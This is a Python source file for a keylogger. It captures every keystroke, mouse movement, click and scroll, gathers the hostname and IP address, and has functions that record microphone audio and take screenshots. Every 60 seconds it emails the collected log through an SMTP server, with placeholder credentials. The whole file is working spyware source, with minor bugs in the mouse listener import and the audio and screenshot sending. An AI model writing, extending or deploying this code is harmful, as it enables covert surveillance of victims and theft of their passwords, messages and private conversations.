import logging
import os
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

EMAIL_ADDRESS = "YOUR_USERNAME"
EMAIL_PASSWORD = "YOUR_PASSWORD"
SEND_REPORT_EVERY = 60  # as in seconds


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x} {y}"
        self.append_log(current_move)

    def on_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        current_click = f"{action} at {x} {y} with button {button}"
        self.append_log(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Scrolled at {x} {y} with delta {dx} {dy}"
        self.append_log(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {key} "

        self.append_log(current_key)

    def send_mail(self, email, password, message):
        sender = "Private Person <from@example.com>"
        receiver = "A Test User <to@example.com>"

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"
        body = f"Keylogger\n{message}"
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.send_message(msg)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = os.uname().machine
        system = os.uname().system
        self.append_log(f"Hostname: {hostname}\nIP Address: {ip}\nPlatform: {plat}\nSystem: {system}")

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

    def screenshot(self):
        img = pyscreenshot.grab()
        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        mouse_listener = Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)

        with keyboard_listener, mouse_listener:
            self.report()
            keyboard_listener.join()
            mouse_listener.join()


keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
